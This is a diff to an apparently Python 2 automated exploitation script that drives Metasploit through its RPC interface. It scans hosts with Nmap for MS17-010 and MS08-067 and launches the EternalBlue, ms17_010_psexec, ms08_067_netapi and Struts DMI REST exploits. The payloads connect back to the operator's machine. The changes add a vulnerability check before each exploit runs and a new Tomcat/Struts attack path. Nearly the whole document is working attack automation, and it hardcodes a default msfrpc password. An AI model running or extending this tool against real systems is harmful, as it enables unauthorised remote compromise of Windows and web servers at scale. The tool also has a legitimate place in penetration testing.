@@ -1,5 +1,6 @@
 #!/usr/bin/env python2
 
+import re
 import os
 import sys
 import time
@@ -23,6 +24,7 @@ def parse_args():
     parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
     parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
     parser.add_argument("-x", "--xml", help="Nmap XML file")
+    parser.add_argument("--nmap-args", help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
     return parser.parse_args()
 
 # Colored terminal output
@@ -91,7 +93,7 @@ def parse_nmap(args):
                     print_bad('Error importing host list file. Are you sure you chose the right file?')
                     sys.exit()
 
-        report = nmap_scan(hosts)
+        report = nmap_scan(hosts, args.nmap_args)
 
     else:
         print_bad('Specify hostlist with: -l <hostlist.txt>')
@@ -99,12 +101,13 @@ def parse_nmap(args):
 
     return report
 
-def nmap_scan(hosts):
+def nmap_scan(hosts, add_args):
     '''
     Do Nmap scan
     '''
     #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
-    nmap_args = '-sS -O -T4 -sV -n --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'
+    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'.format(add_args)
+    print_info('Running: nmap {}'.format(nmap_args))
     nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
     rc = nmap_proc.sudo_run_background()
     nmap_status_printer(nmap_proc)
@@ -173,13 +176,13 @@ def check_named_pipes(c_id, ip, nmap_os):
     If we can get a named pipe then we'll use Romance/Synergy over Blue
     '''
     pipes = None
-    pipe_audit_path = 'auxiliary/scanner/smb/pipe_auditor'
+    path = 'auxiliary/scanner/smb/pipe_auditor'
     rhost_var = 'RHOSTS'
     port = '445'
-    extra_opts = ''
-    payload = get_payload(pipe_audit_path, nmap_os)
-    pipe_auditor_cmd = create_msf_cmd(pipe_audit_path, rhost_var, ip, port, payload, extra_opts)
-    output = get_module_output(c_id, pipe_auditor_cmd)
+    opts = ''
+    payload = get_payload(path, nmap_os)
+    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
+    mod_out = run_console_cmd(c_id, cmd)
 
     # Example output:
     '''
@@ -189,7 +192,7 @@ def check_named_pipes(c_id, ip, nmap_os):
        '[*] Auxiliary module execution completed']
     '''
 
-    for l in output:
+    for l in mod_out:
         delim = 'Pipes: '
         if delim in l:
             pipes = l.split(delim)[1].split(', ')
@@ -232,7 +235,7 @@ def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
     ExitOnSession True; even if we use aux module this just won't do anything
     '''
     local_ip = get_local_ip(get_iface())
-    print_info('Executing {}'.format(module_path))
+    print_info('Setting options on {}'.format(module_path))
     cmds = """
            use {}\n
            set {} {}\n
@@ -241,18 +244,24 @@ def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
            set payload {}\n
            {}\n
            set ExitOnSession True\n
-           exploit -z\n
            """.format(module_path, rhost_var, ip, port, local_ip, payload, extra_opts)
 
     return cmds
 
-def get_module_output(c_id, cmd):
+def run_console_cmd(c_id, cmd):
     '''
     Runs module and gets output
     '''
+    print_info('Running MSF command(s):')
+    for l in cmd.splitlines():
+        l = l.strip()
+        if l != '':
+            print_info('    {}'.format(l))
+    print ''
     CLIENT.call('console.write',[c_id, cmd])
     time.sleep(3)
     mod_output = wait_on_busy_console(c_id)
+    print ''
 
     return mod_output
 
@@ -275,6 +284,7 @@ def get_payload(module, nmap_os):
     if payloads.get('error'):
         if 'auxiliary' not in module:
             print_bad('Error getting payload for {}'.format(module))
+            embed()
         else:
             # For aux modules we just set an arbitrary real payload
             payload = win_payloads[0]
@@ -316,6 +326,27 @@ def check_nse_vuln_scripts(host, script):
 
     return False
 
+def check_vuln(c_id):
+    '''
+    Check if the machine is vulnerable
+    '''
+    # potential messages: 
+    # Check failed: ..."
+    # Cannot reliably check exploitability
+    cmd = 'check\n'
+    out = run_console_cmd(c_id, cmd)
+    not_sure_msgs = ['Cannot reliably check exploitability', 'The state could not be determined']
+    if out:
+        for l in out:
+            if 'is vulnerable' in l:
+                print_good('Vulnerable!')
+                return True
+            elif any(x in l for x in not_sure_msgs):
+                print_info('Unsure if vulnerable, continuing with exploit')
+                return True
+
+    return False
+
 def run_exploits(c_id, host):
     '''
     Checks for exploitable services on a host
@@ -328,25 +359,48 @@ def run_exploits(c_id, host):
     if ms17_vuln == True:
         mod_output = run_ms17(c_id, host)
 
-#def print_module_output(output, module):
-#    print_info('{} output:'.format(module))
-#    for l in output:
-#        print '    '+l.strip()
+    for s in host.services:
+        if s.open():
+            if 'Apache Tomcat/Coyote JSP engine version: 1.1' in s.banner:
+                port = str(s.port)
+                mod_output = run_struts_dmi_rest_exec(c_id, host, port)
+
+def run_if_vuln(c_id, cmd):
+    is_vulnerable = check_vuln(c_id)
+    if is_vulnerable == True:
+        exploit_cmd = 'exploit -z\n'
+        mod_out = run_console_cmd(c_id, exploit_cmd)
+
+        return mod_out
+
+def run_struts_dmi_rest_exec(c_id, host, port):
+    path = 'exploit/multi/http/struts_dmi_rest_exec'
+    ip = host.address
+    rhost_var = 'RHOST'
+    opts = ''
+    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
+    payload = get_payload(path, nmap_os)
+    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
+    settings_out = run_console_cmd(c_id, cmd)
+    print_info('Checking if host is vulnerable...')
+    output = run_if_vuln(c_id, cmd)
+    return output
 
 def run_ms08(c_id, host):
     '''
     Exploit ms08_067
     '''
+    path = 'exploit/windows/smb/ms08_067_netapi'
     ip = host.address
     nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
     port = '445'
-    ms08_path = 'exploit/windows/smb/ms08_067_netapi'
-    ms08_rhost_var = 'RHOST'
-    ms08_opts = ''
-    ms08_payload = get_payload(ms08_path, nmap_os)
-    ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, ms08_payload, ms08_opts)
-    mod_output = get_module_output(c_id, ms08_cmd)
-
+    rhost_var = 'RHOST'
+    opts = ''
+    payload = get_payload(path, nmap_os)
+    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
+    settings_out = run_console_cmd(c_id, cmd)
+    print_info('Checking if host is vulnerable...')
+    output = run_if_vuln(c_id, cmd)
     return output
 
 def run_ms17(c_id, host):
@@ -356,6 +410,7 @@ def run_ms17(c_id, host):
     ip = host.address
     nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
     port = '445'
+    rhost_var = 'RHOST'
 
     # Check for named pipe availability (preVista you could just grab em)
     # If we find one, then use Romance/Synergy instead of Blue
@@ -364,23 +419,37 @@ def run_ms17(c_id, host):
 
     # Just use the first named pipe
     if named_pipes:
+        print named_pipes #1111
+        print_good('Named pipe found! Performing more reliable ms17_010_psexec instead of eternalblue')
         named_pipe = named_pipes[0]
-
-    ms17_rhost_var = 'RHOST'
-
-    if named_pipe:
-        ms17_path = 'exploit/windows/smb/ms17_010_psexec'
-        ms17_opts = 'set NAMEDPIPE {}'.format(named_pipe)
+        path = 'exploit/windows/smb/ms17_010_psexec'
+        opts = 'set NAMEDPIPE {}'.format(named_pipe)
     else:
-        ms17_path = 'exploit/windows/smb/ms17_010_eternalblue'
-        ms17_opts = ''
+        print_info('Named pipe not found. Performing ms17_010_eternalblue')
+        path = 'exploit/windows/smb/ms17_010_eternalblue'
+        opts = 'set MaxExploitAttempts 6'
 
-    ms17_payload = get_payload(ms17_path, nmap_os)
+    payload = get_payload(path, nmap_os)
+    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
+    settings_out = run_console_cmd(c_id, cmd)
+    print_info('Checking if host is vulnerable...')
+    output = run_if_vuln(c_id, cmd)
+    return output
 
-    ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_payload, ms17_opts)
-    mod_output = get_module_output(c_id, ms17_cmd)
+def print_cur_output(c_id):
+    output = []
+    cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
+    for l in cur_output:
+        l = l.strip()
+        if l != '':
+            output.append(l)
+            if re.search('Session . created in the background', l):
+                print ''
+                print_great(l)
+            else:
+                print '    '+l
 
-    return mod_output
+    return output
 
 def wait_on_busy_console(c_id):
     '''
@@ -392,20 +461,17 @@ def wait_on_busy_console(c_id):
     '''
     output = []
     list_offset = int([x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0])
+    # Get any initial output
+    cur_out = print_cur_output(c_id)
+    output += cur_out
     while CLIENT.call('console.list')['consoles'][list_offset]['busy'] == True:
-        cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
-        for l in cur_output:
-            l = l.strip()
-            output.append(l)
-            print '    '+l.strip()
+        cur_out = print_cur_output(c_id)
+        output += cur_out
         time.sleep(1)
 
     # Get remaining output
-    cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
-    for l in cur_output:
-        l = l.strip()
-        output.append(l)
-        print '    '+l.strip()
+    cur_out = print_cur_output(c_id)
+    output += cur_out
 
     return output
 
@@ -431,6 +497,8 @@ def main(report, args):
     if len(c_ids) == 0:
         CLIENT.call('console.create')
         c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
+        # Wait for response
+        time.sleep(2)
         # Clear output buffer
         CLIENT.call('console.read', [c_id])['data'].splitlines()
 
